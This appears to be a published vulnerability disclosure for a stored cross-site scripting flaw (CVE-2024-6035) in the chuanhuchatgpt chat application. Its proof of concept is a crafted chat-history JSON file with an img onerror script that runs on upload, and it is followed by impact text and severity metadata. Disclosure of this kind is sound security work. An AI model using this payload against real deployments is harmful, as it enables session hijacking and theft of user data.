@@ -1,0 +1,61 @@
+Title: Stored XSS via Chat History upload in gaizhenbiao/chuanhuchatgpt
+
+Proof of Concept: 
+Create test.json file with following content:
+
+{
+    "system": "You are a helpful assistant.",
+    "history": [
+        {
+            "role": "user",
+            "content": "hello"
+        },
+        {
+            "role": "assistant",
+            "content": "Hello there! How can I assist you today?"
+        }
+    ],
+    "chatbot": [
+        [
+            "<div class=\"user-message\">hello</div>",
+            "<img src=x onerror=alert(document.domain)><div class=\"raw-message hideM\"><pre class=\"fake-pre\">Hello there&#33; How can I assist you today?</pre></div><div class=\"md-message\">\n\nHello there! How can I assist you today?\n</div>"
+        ]
+    ],
+    "model_name": "gpt-3.5-turbo",
+    "single_turn": false,
+    "temperature": 1.0,
+    "top_p": 1.0,
+    "n_choices": 1,
+    "stop_sequence": [],
+    "token_upper_limit": 30720,
+    "max_generation_token": null,
+    "presence_penalty": 0.0,
+    "frequency_penalty": 0.0,
+    "logit_bias": null,
+    "user_identifier": "user1",
+    "metadata": {}
+}
+
+Upload it, via conversation panel. Done, XSS will be executed immediately
+
+Impact: 
+Attackers can inject malicious scripts that steal sensitive user data, such as login credentials, personal information, and payment details. This can lead to identity theft and financial loss for users.Malicious scripts can hijack user sessions by stealing session cookies. This allows attackers to impersonate users and gain unauthorized access to their accounts.Stored XSS can be used to deliver malicious payloads, including malware and ransomware, to users' devices. This can result in widespread infection and significant damage to users' systems and data.Attackers can create convincing phishing forms within the trusted application, tricking users into providing sensitive information directly to the attacker.
+
+CVE ID: CVE-2024-6035
+Status: (published)
+Vulnerability Type: CWE-79: Cross-site Scripting (XSS) - Stored
+Severity: High (7.4)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: Required
+Scope: Changed
+Confidentiality: High
+Integrity: None
+Availability: None
+Registry: Other
+Affected Version: 20240410
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $900
+Fix Bounty: $225
